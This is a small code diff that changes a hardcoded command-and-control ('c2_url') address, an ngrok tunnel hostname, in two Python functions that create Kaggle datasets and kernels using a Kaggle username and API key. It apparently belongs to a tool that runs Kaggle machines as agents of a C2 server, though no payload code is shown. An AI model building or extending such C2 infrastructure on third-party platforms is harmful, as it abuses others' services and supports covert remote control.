@@ -54,7 +54,7 @@ def create_dataset_and_kernel(
         # Get C2 URL from config
         project_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
         config_path = os.path.join(project_dir, "config.json")
-        c2_url = "https://lynelle-scroddled-corinne.ngrok-free-dev.ngrok-app.com"
+        c2_url = "https://lynelle-scroddled-corinne.ngrok-free.dev"
         
         if os.path.exists(config_path):
             try:
@@ -218,7 +218,7 @@ def create_dataset_with_machines(
         config_path = os.path.join(project_dir, "config.json")
         
         # Load or create config
-        c2_url = "https://lynelle-scroddled-corinne.ngrok-free-dev.ngrok-app.com"
+        c2_url = "https://lynelle-scroddled-corinne.ngrok-free.dev"
         kaggle_username = username  # Default to provided username
         kaggle_api_key = api_key    # Default to provided api_key
         
